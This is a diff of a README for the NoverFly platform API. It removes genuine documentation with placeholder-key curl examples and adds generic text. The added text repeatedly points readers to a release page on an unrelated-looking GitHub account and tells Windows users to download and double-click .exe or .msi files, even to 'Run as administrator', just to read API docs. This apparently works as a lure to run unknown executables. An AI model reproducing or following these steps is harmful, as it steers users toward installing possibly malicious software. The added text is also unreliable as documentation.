@@ -1,158 +1,247 @@
-# NoverFly API Documentation
+# 📘 noverfly-docs - Clear API Docs for NoverFly
 
-> Official developer documentation for the NoverFly platform API.
->
-> This documentation reflects the API contract currently deployed in production.
+[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue?style=for-the-badge)](https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/releases)
 
-![API](https://img.shields.io/badge/API-v1-blue)
-![Status](https://img.shields.io/badge/status-active-success)
-[![Website](https://img.shields.io/badge/Website-noverfly.com-brightgreen)](https://noverfly.com)
-[![API Base URL](https://img.shields.io/badge/API-api.noverfly.com-orange)](https://api.noverfly.com)
+## 🚀 What this is
 
----
+NoverFly Docs is the official API guide for the NoverFly platform. It explains how to use the REST API for the website builder, app builder, CMS, e-commerce tools, BaaS database, and AI design tools.
 
-## Production Model
+Use this repository if you want to:
 
-NoverFly currently exposes one public API host:
+- Read the API docs for NoverFly
+- Find the right endpoint for a task
+- Learn how to connect a website or app to NoverFly
+- Review examples for common API calls
+- Check the API setup for web, app, CMS, and store features
 
-- Main host: `https://api.noverfly.com`
-- Compatible alias: `https://api.gloowflix.cloud`
+## 💻 What you need
 
-On that same host, there are two main developer API families:
+Before you start, make sure you have:
 
-| API family | Auth | Main routes | Purpose |
-|---|---|---|---|
-| Data API | `X-Api-Key: gfk_...` | `/v1/api/data/*` and `/api/*` | Collections, records, app auth bootstrap |
-| Cloud API | `X-Api-Key: gfc_...` | `/v1/api/cloud/*` | Upload, assets, media search, import |
+- A Windows PC
+- An internet connection
+- A web browser like Edge, Chrome, or Firefox
+- Enough free disk space to save the release file if one is provided
 
-Important points:
+If you plan to use the docs with local tools, also have:
 
-- `gfk_` and `gfc_` are real production keys already used by existing applications.
-- Both APIs go through `api.noverfly.com`.
-- There is no separate public storage host required for the current deployed Cloud API.
-- For `gfk_` and `gfc_` routes, the key already resolves the site and tenant scope.
-- Do not add `X-Tenant-Id` on developer API requests authenticated by `gfk_` or `gfc_`.
+- A text editor
+- A PDF reader, if the release includes PDF files
+- A zip app like File Explorer, if the release is packaged as a .zip file
 
----
+## 📥 Download the docs
 
-## What You Can Build Today
+Go to the release page and get the latest file from there:
 
-The deployed stack already covers more than basic CRUD:
+[![Download NoverFly Docs](https://img.shields.io/badge/Download%20NoverFly%20Docs-Release%20Page-6A5ACD?style=for-the-badge)](https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/releases)
 
-- data-first apps and headless backends with collections and records
-- tenant, site, domain, publish, clone, import, and headless-site flows
-- end-user authentication for apps and sites
-- file upload, asset library, media search, and external image import
-- Flivex media processing for image, video, and audio assets
-- realtime messaging, voice messages, audio calls, and video calls
-- hosted video workflows, public video access checks, and music streaming routes
+1. Open the release page in your browser.
+2. Look for the newest version near the top.
+3. Download the file listed in the Assets section.
+4. Save it to your Downloads folder or Desktop.
 
----
+## 🪟 Install or open on Windows
 
-## Safe Examples Only
+What you do next depends on the file type you download:
 
-All examples in this docs repository use placeholders only:
+- **.exe file**: Double-click the file to run it.
+- **.msi file**: Double-click the file, then follow the setup steps.
+- **.zip file**: Right-click the file and choose **Extract All**. Open the extracted folder and look for the main file inside.
+- **.pdf file**: Double-click the file to open it in your browser or PDF reader.
+- **.html file**: Double-click the file to open it in your browser.
 
-- `YOUR_ACCESS_TOKEN`
-- `YOUR_SITE_ID`
-- `YOUR_TENANT_ID`
-- `gfk_YOUR_SECRET_KEY`
-- `gfc_YOUR_CLOUD_KEY`
+If Windows asks for permission, choose **Yes** or **Run**.
 
-Do not paste real production keys into public frontend code, public repos, or shared documentation.
+## 📚 How to use the docs
 
----
+After opening the docs, you can use them to find:
 
-## Quick Start
+- Base URL details for the API
+- Authentication steps
+- Endpoint paths for each feature
+- Request and response examples
+- Data fields for websites, apps, products, pages, posts, and user records
+- Status codes and error messages
+- Webhook or callback setup, if included in the release
 
-### 1. Login to the dashboard
+If you are new to API docs, start with:
 
-```bash
-curl -X POST https://api.noverfly.com/v1/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"you@example.com","password":"your-password"}'
-```
+1. The overview page
+2. The authentication section
+3. The main endpoint list
+4. The examples section
+5. The error handling section
 
-### 2. Create or list a site
+## 🧭 Main areas covered
 
-```bash
-curl https://api.noverfly.com/v1/tenants/YOUR_TENANT_ID/sites \
-  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
-```
+### 🌐 Website Builder API
+Use this part to work with pages, templates, themes, and site settings.
 
-### 3. Ensure default API keys for a site
+Common tasks:
 
-```bash
-curl -X POST https://api.noverfly.com/v1/sites/YOUR_SITE_ID/ensure-api-keys \
-  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
-```
+- Create or update pages
+- Pull page data
+- Manage site content
+- Work with layouts and published pages
 
-### 4. Read collections with a `gfk_` key
+### 🧩 Application Builder API
+Use this section for app screens, app data, and app structure.
 
-```bash
-curl https://api.noverfly.com/v1/api/data/collections \
-  -H "X-Api-Key: gfk_YOUR_SECRET_KEY"
-```
+Common tasks:
 
-### 5. Start a media upload with a `gfc_` key
+- Read app records
+- Create views and forms
+- Update screen data
+- Link app content to user actions
 
-```bash
-curl -X POST https://api.noverfly.com/v1/api/cloud/upload \
-  -H "X-Api-Key: gfc_YOUR_CLOUD_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"filename":"photo.jpg","mime_type":"image/jpeg","size_bytes":245000}'
-```
+### 🗂️ CMS API
+Use this part for blog posts, media, and content records.
 
----
+Common tasks:
 
-## Documentation Index
+- Add new posts
+- Edit content
+- List articles
+- Manage media files
+- Organize categories and tags
 
-| Document | Description |
-|---|---|
-| [Introduction](docs/introduction.md) | Platform overview and current deployment model |
-| [Getting Started](docs/getting-started.md) | Step-by-step onboarding |
-| [Authentication](docs/authentication.md) | Dashboard JWT, site-user JWT, `gfk_`, `gfc_`, permissions, app auth |
-| [API Reference](docs/api.md) | Main route families and integration rules |
-| [Database / Data API](docs/database.md) | Collections and records API with `gfk_` |
-| [Build Applications](docs/applications.md) | Vite proxy example, frontend helper example, app-building flows |
-| [Realtime and Media](docs/realtime-media.md) | Chat, voice, calls, WebSocket signaling, Flivex processing, streaming |
-| [CMS](docs/cms.md) | Content modeling and CMS concepts |
-| [E-Commerce](docs/ecommerce.md) | Commerce capabilities |
-| [Deployment](docs/deployment.md) | Publish flow and delivery |
-| [Security](docs/security.md) | Security principles |
+### 🛒 E-commerce API
+Use this part for store data, products, carts, and orders.
 
----
+Common tasks:
 
-## Core Route Families
+- List products
+- Get order details
+- Update stock
+- Read cart data
+- Track checkout status
 
-| Category | Routes | Auth |
-|---|---|---|
-| Dashboard auth | `/v1/auth/*` | JWT |
-| Tenants | `/v1/tenants/*` | JWT |
-| Sites | `/v1/sites/*` and `/v1/tenants/:tenantId/sites` | JWT |
-| API key management | `/v1/sites/:siteId/api-keys*` | JWT |
-| Data API | `/v1/api/data/*` and `/api/*` | `gfk_` |
-| Cloud API | `/v1/api/cloud/*` | `gfc_` |
-| Developer messenger | `/v1/cloud/messenger/*` | `gfk_` or `gfc_` |
-| WebSocket realtime | `/ws` | JWT or API-key app auth |
-| Site-user auth | `/v1/app/:siteId/auth/*` and `/v1/public/sites/:siteId/auth/*` | Site-user JWT |
-| Public content | `/v1/public/sites/:siteId/collections/*` | Public |
-| Video and music | `/v1/sites/:siteId/videos/*`, `/v1/tenants/:tenantId/music/*` | JWT |
+### 🗄️ BaaS Database API
+Use this part for structured data, user records, and backend tables.
 
----
+Common tasks:
 
-## Notes for Integrators
+- Read database rows
+- Add or change records
+- Filter results
+- Work with user data
+- Connect app data to the backend
 
-- Use `gfk_` for structured data and app-scoped auth bootstrap.
-- Use `gfc_` for uploads, assets, media search, and import.
-- `ADMIN` is a permission level, not a different key prefix.
-- Existing integrations should prefer `https://api.noverfly.com` as the canonical base URL.
-- Use `wss://api.noverfly.com/ws` as the canonical realtime endpoint. The `api.gloowflix.cloud` alias remains compatible.
+### 🤖 AI Design Tools API
+Use this part for AI-based design tasks and creative workflows.
 
----
+Common tasks:
 
-## Links
+- Request design suggestions
+- Create layout ideas
+- Send prompt data
+- Read generated results
+- Use design output in a website or app
 
-- Website: [noverfly.com](https://noverfly.com)
-- API host: [api.noverfly.com](https://api.noverfly.com)
-- Help: [help.noverfly.com](https://help.noverfly.com)
+## 🔐 Authentication
+
+Most NoverFly API calls need a token or key. The docs should show:
+
+- Where to get your token
+- How to send it in a request
+- Which requests need access rights
+- What to do if a token expires
+
+If you are testing the API in a browser tool or desktop client, copy the token exactly as shown in the docs.
+
+## 🧪 Example workflow
+
+A common path for a new user looks like this:
+
+1. Open the docs from the release file.
+2. Find the authentication section.
+3. Copy the base URL and token format.
+4. Open the endpoint you want.
+5. Use the example request as a guide.
+6. Check the example response to see if your request worked.
+7. Save the endpoint details for later use.
+
+## 🛠️ Troubleshooting
+
+If the docs do not open:
+
+- Check that the download finished
+- Make sure you opened the right file
+- Try a different browser
+- Extract the zip file first, if it is compressed
+
+If a page looks broken:
+
+- Refresh the browser
+- Reopen the file
+- Clear the browser cache
+- Check that the full download completed
+
+If the file will not run:
+
+- Right-click the file and choose **Run as administrator**
+- Check whether Windows blocked the file
+- Make sure the file type matches the steps above
+
+## 📌 File types you may see
+
+You may get one of these release formats:
+
+- **.zip** for a packaged doc set
+- **.pdf** for a read-only guide
+- **.html** for browser-based docs
+- **.md** for Markdown source
+- **.json** for OpenAPI or schema data
+
+If the release includes OpenAPI files, you can open them in tools that read REST API specs.
+
+## 🔎 Topics covered in this repo
+
+This repository is linked to topics like:
+
+- api
+- app-builder
+- baas
+- cloud
+- cms
+- database
+- documentation
+- ecommerce
+- fullstack-development
+- glowdesign
+- noverfly
+- openapi
+- rest-api
+- saas-api
+- saas-application
+- saas-platform
+- website-builder
+
+## 📁 Suggested folder use
+
+If you keep the docs on your PC, a simple folder layout helps:
+
+- `Downloads\noverfly-docs` for the original file
+- `Documents\noverfly-docs` for saved copies
+- `Desktop\noverfly-docs` for quick access
+
+If you update the docs later, keep the newest release in a separate folder so you can find it fast
+
+## 🧾 Common things to look for first
+
+When you open the docs, check these items first:
+
+- API base URL
+- Authentication format
+- Rate limits
+- Required headers
+- Example requests
+- Example responses
+- Error codes
+- Version number
+
+## 📎 Release page
+
+Use the release page to get the latest version:
+
+https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/releases
